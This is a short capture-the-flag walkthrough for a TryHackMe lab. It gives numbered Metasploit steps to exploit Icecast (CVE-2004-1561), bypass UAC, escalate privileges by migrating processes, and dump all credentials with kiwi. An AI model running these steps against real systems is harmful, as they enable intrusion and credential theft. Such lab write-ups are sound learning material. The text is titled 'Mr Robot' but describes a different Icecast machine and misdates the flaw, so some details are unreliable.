                                                                                                                                        This is a walkthrough of how how solved the Mr Robot CTF on TryHackMe 

1. Connect With the TryHackMe server using Command  $ sudo openvpn Downloads/Ynos.ovpn
2. Confirm You can Connect to the Machine using the command $ ping (Ip of the machine)
3. Run nmap quick scan plus using the command $nmap -sV -O -T5 -p- 10.10.77.72 -oN Nmap.results
4. Check if it has a website  ,no website for this machine
5. The nmap results show that various ports are open including the Microsoft remote desktop(MSDRP) and 8000 using Icecast
6. IceCast is a known vulnerability that was exploited back in the 90's but this device has opened port for it , so we'll quickly check its CVE number that is 2004:1561
7. Now we will use metaspliot to exploit this vulnerability 
8. First type spool $icecast.metaspliot this will create a icecast named file and save all the findings in it 
9. Then we can search $ search cve:2004-1561 to find all the exploits related to this vulnearbility
10. As it has the number 0 we will type $use 0
11. It will start the exploit 
12. The we will have to check the lhosts and rhosts value 
13. Here set lhost as tun0 and rhosts as ip of the target
14. Now just type $exploit or run and the attack will start on its own 
15. After we have gained access to the shell through meterpreter we should gather recon using $getuid and $sysinfo
16. now for some further recon run $post/multi/recon/local_exploit_suggester
17. run this exploit$exploit/windows/local/bypassuac_eventvwr
18. send this session to background using $background
19. then we will open options and give our meterpreter session id and set lhosts as tun0
20. now type again $exploit
21. now we have to escalate privilege so we will migrate using command $migrate -N PROCESS_NAME here 1372
22. now we have gained admin acess , you can see this my typing $getuid
23. now load kiwi to get all the passwords using command $load kiwi
24. type help to get all the commands you can use
25. type $creds_all to get all the credentials
